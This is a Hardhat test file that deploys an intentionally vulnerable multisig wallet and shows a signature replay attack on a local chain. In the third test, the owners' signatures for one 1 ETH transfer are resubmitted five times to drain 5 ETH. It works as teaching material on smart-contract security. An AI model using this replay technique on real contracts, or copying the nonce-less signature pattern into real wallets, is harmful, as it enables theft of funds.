const { expect } = require("chai");
const { providers } = require("ethers");
const { ethers } = require("hardhat");

describe("Replay Attack", function () {
  let deployer, owners = [], user, attacker;

  beforeEach(async function () {
    [deployer, owners[0], owners[1], user, attacker] = await ethers.getSigners();

    const VulnerableMultiSigWallet = await ethers.getContractFactory("MultiSigWallet", deployer);
    this.vulnerableMultiSigWallet = await VulnerableMultiSigWallet.deploy([owners[0].address,owners[1].address]);

    // Owners fund the MultiSig Wallet contract
    for(i = 0; i < owners.length; i++) {
      await owners[i].sendTransaction({ to: this.vulnerableMultiSigWallet.address, value: ethers.utils.parseEther("5") });
    }    

  });

  describe("MultiSigWallet - Vulnerable Version", function () {

    it("Validate multisig wallet owners are the correct owners", async function () {
      for(i = 0; i < owners.length; i++) {
        expect(await this.vulnerableMultiSigWallet.owners(i)).to.eq(owners[i].address);
      }
    });

    it("Should allow transfer funds after receiving both signatures", async function () {
      const userBalanceBefore = await ethers.provider.getBalance(user.address);

      let txHashes = []
      let signatures = []
      const amount = ethers.utils.parseEther("1");

      // Owners signing process to generate the signatures for transfering 1ETH to the user account
      for(i = 0; i < owners.length; i++) {
        // Generate the hash of the message that will be signed
        txHashes[i] = await this.vulnerableMultiSigWallet.connect(owners[i]).getTxHash(user.address,amount);
        // Owners sign their respective message -> Generate the signatures using the private keys of the owners
        signatures[i] = await owners[i].signMessage(ethers.utils.arrayify(txHashes[i])); // each individual signature will be a string
      }

      await this.vulnerableMultiSigWallet.transfer(user.address,amount,signatures)

      const userBalanceAfter = await ethers.provider.getBalance(user.address);

      expect(userBalanceAfter).to.eq(userBalanceBefore.add(amount));
    });

    it("Performing a replay attack on the vulnerable MultiSigWallet", async function () {
      console.log("Replaying 5 times the signatures that owners approved to transfer 1ETH to the user account");
      
      const userBalanceBefore = await ethers.provider.getBalance(user.address);
      const multiSigWalletBalanceBefore = await ethers.provider.getBalance(this.vulnerableMultiSigWallet.address);

      let txHashes = []
      let signatures = []
      const amount = ethers.utils.parseEther("1");

      // Owners signing process to generate the signatures for transfering 1ETH to the user account
      for(i = 0; i < owners.length; i++) {
        // Generate the hash of the message that will be signed
        txHashes[i] = await this.vulnerableMultiSigWallet.connect(owners[i]).getTxHash(user.address,amount);
        // Owners sign their respective message -> Generate the signatures using the private keys of the owners
        signatures[i] = await owners[i].signMessage(ethers.utils.arrayify(txHashes[i])); // each individual signature will be a string
      }

      // Replaying the signatures 5 times to transfer 5 times what the owners really approved!
      await this.vulnerableMultiSigWallet.transfer(user.address,amount,signatures)
      await this.vulnerableMultiSigWallet.transfer(user.address,amount,signatures)
      await this.vulnerableMultiSigWallet.transfer(user.address,amount,signatures)
      await this.vulnerableMultiSigWallet.transfer(user.address,amount,signatures)
      await this.vulnerableMultiSigWallet.transfer(user.address,amount,signatures)

      const userBalanceAfter = await ethers.provider.getBalance(user.address);
      const multiSigWalletBalanceAfter = await ethers.provider.getBalance(this.vulnerableMultiSigWallet.address);

      const amountTransferedByTheReplayAttack = ethers.utils.parseEther("5");

      // Validate the balance of the user account
      expect(userBalanceAfter).to.eq(userBalanceBefore.add(amountTransferedByTheReplayAttack));

      // Validate the balance of the multisig wallet contract
      expect(multiSigWalletBalanceAfter).to.eq(multiSigWalletBalanceBefore.sub(amountTransferedByTheReplayAttack));

    });
  });
});
